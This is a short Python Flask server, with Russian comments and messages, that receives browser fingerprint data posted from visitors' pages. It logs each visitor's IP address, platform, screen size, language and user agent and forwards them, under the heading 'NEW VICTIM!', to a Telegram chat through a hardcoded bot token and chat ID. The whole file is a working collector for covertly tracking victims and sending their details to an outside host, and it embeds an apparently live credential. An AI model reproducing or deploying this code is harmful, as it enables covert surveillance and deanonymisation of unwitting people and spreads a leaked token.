from flask import Flask, request
import requests

app = Flask(__name__)

TELEGRAM_TOKEN = "8861612688:AAGHhJMkESLYIOfAQmDgEeILm3-mJAbmyLc"
CHAT_ID = "5609993893"

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    # Берем IP (Render передает его в заголовке)
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    
    msg = f"🚨 **НОВАЯ ЖЕРТВА!**\n\n"
    msg += f"🌐 **IP:** {ip}\n"
    msg += f"💻 **Платформа:** {data.get('platform', 'Неизвестно')}\n"
    msg += f"📺 **Экран:** {data.get('screen', 'Неизвестно')}\n"
    msg += f"🗣 **Язык:** {data.get('language', 'Неизвестно')}\n"
    msg += f"📱 **Браузер:** {data.get('userAgent', 'Неизвестно')}"

    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    payload = {"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"}
    
    try:
        requests.post(url, json=payload, timeout=5)
    except Exception as e:
        print(f"Ошибка ТГ: {e}")

    return "OK", 200

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
